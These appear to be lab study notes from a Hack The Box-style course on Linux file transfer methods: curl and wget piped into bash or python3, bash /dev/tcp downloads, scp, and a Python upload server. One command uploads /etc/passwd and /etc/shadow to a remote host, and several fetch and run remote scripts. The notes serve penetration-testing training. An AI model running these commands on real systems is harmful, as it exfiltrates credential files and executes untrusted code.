* most malware on all different operating systems uses `HTTP` and `HTTPS` for communication.

### useful example of piping in linux & stdin stdout

#### Fileless Download with cURL
* notice the pipe to python3 & bash?
```shell-session
canklesmaks@htb[/htb]$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```
Similarly, we can download a Python script file from a web server and pipe it into the Python binary. Let's do that, this time using `wget`.
#### Fileless Download with wget
```shell-session
canklesmaks@htb[/htb]$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3

Hello World!
```
---
# Exec
	In computing, exec is a functionality of an operating system that runs an executable file in the context of an already existing process, replacing the previous executable. This act is also referred to as an overlay. It is especially important in Unix-like systems, although it also exists elsewhere.
## Download with Bash (/dev/tcp)
#### Connect to the Target Webserver
```shell-session
canklesmaks@htb[/htb]$ exec 3<>/dev/tcp/10.10.10.32/80
```
#### HTTP GET Request
```shell-session
canklesmaks@htb[/htb]$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```
#### Print the Response
```shell-session
canklesmaks@htb[/htb]$ cat <&3
```
#### SSH downloads
 * you can use SCP (secure copy) over ssh to download files.
 ```shell-session
canklesmaks@htb[/htb]$ scp plaintext@192.168.49.128:/root/myroot.txt . 
```
* you can also start an upload server.
```shell-session
canklesmaks@htb[/htb]$ sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```
#### Linux - Upload Multiple Files

```shell-session
canklesmaks@htb[/htb]$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

We used the option `--insecure` because we used a self-signed certificate that we trust.